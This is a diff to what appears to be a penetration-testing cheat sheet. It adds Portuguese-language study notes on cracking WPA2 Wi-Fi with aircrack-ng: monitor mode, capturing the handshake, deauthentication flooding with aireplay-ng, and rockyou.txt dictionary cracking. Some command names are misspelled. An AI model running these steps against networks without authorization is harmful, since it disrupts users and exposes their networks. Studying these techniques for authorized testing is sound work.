@@ -165,8 +165,26 @@ nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQ
 # Cracking Wi-Fi networks
 ```
 Cracking Wifi Password
-aircrack-ng [pcap file] (For cracking WEP network)
+aircrack-ng [pcap file] (For cracking WEP network) soh isso mesmo
 aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)
+aircrack-ng WPA2crack-01.cap -w password.txt --> isso pra wpa2 tbm
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C0:F6:C2:5E:8D:20 pass*.cap
+BSSID - endereco mac do AP
+ESSID - broadcast name do AP
+Step 1 - Capture the foiur way handshake with Airmon-ng
+iwconfig - checa se existe adaptador wifi
+airmon-ng start wlan0 - ativa monitor mode
+airdump-ng wlan0mon
+airdump-ng -c 6 --bssid C0:F6:C2:5E:8D:20 -w pass wlan0mon    -   6 canal de wifi .. pass 'e um nome de arquivo wlan0mon 'e um nome de interface
+aireplay-ng -0 100 -a C0:F6:C2:5E:8D:20 wlan0mon
+de repente aparece um tal de WPA Handsheke com o MAC o AP
+descompacta o rockyou,txt.gz com gunzip arquivocompactado
+da'i tem um pcap do nada no diretorio
+da'i ele faz ircrack-ng -w /usr/share/wordlists/rockyou.txt -b C0:F6:C2:5E:8D:20 pass*.cap e encontra a senha da rede wifi
+... inutil
+
+Step 2 - Aircrack-ng Brute FOrce Dictionary
+
 
 ```
 #  Some extra work 
